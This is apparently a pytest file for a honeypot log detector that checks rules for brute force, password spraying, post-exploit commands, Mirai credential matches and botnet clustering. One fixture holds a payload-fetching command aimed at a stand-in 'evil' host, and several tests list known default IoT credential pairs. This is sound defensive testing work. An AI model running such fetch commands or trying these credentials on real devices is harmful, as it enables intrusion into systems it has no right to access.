from secu import detect


def test_brute_force_fires_over_threshold(brute_force_events):
    findings = detect.detect_brute_force(brute_force_events)
    assert len(findings) == 1
    assert findings[0]["rule_id"] == "BRUTE_FORCE"
    assert findings[0]["src_ip"] == "198.51.100.7"


def test_brute_force_silent_under_threshold():
    events = [
        {"eventid": "cowrie.login.failed", "timestamp": f"2026-09-13T10:00:0{i}Z", "src_ip": "1.2.3.4"}
        for i in range(3)
    ]
    assert detect.detect_brute_force(events) == []


def test_password_spray_fires(password_spray_events):
    findings = detect.detect_password_spray(password_spray_events)
    assert len(findings) == 1
    assert findings[0]["rule_id"] == "PASSWORD_SPRAY"
    assert "123456" in findings[0]["evidence"]


def test_successful_login_is_high_severity():
    events = [{"eventid": "cowrie.login.success", "timestamp": "2026-09-13T12:00:00Z",
               "src_ip": "1.2.3.4", "username": "root", "password": "toor"}]
    findings = detect.detect_successful_logins(events)
    assert len(findings) == 1
    assert findings[0]["severity"] == "high"


def test_post_exploit_requires_prior_success(post_exploit_session_events):
    findings = detect.detect_post_exploit(post_exploit_session_events)
    rule_ids = {f["rule_id"] for f in findings}
    assert "PAYLOAD_STAGING" in rule_ids
    assert "POST_EXPLOIT_EXEC" in rule_ids


def test_post_exploit_ignores_commands_without_login_success():
    events = [
        {"eventid": "cowrie.command.input", "timestamp": "2026-09-13T12:00:00Z",
         "src_ip": "1.2.3.4", "session": "nosession", "input": "wget http://evil/x"},
    ]
    assert detect.detect_post_exploit(events) == []


def test_mirai_provenance_counts_only_known_pairs(mirai_credential_events):
    result = detect.analyze_mirai_provenance(mirai_credential_events)
    assert result["total_attempts"] == 3
    assert result["mirai_matches"] == 2
    assert result["mirai_match_pct"] == round(2 / 3 * 100, 1)


def test_botnet_clustering_groups_shared_credentials():
    shared_creds = [("root", "xc3511"), ("admin", "888888")]
    events = []
    for ip in ("10.0.0.1", "10.0.0.2"):
        for user, pw in shared_creds:
            events.append({
                "eventid": "cowrie.login.failed", "timestamp": "2026-09-13T14:00:00Z",
                "src_ip": ip, "username": user, "password": pw,
            })
    clusters = detect.analyze_botnet_clusters(events)
    assert len(clusters) == 1
    assert clusters[0]["size"] == 2
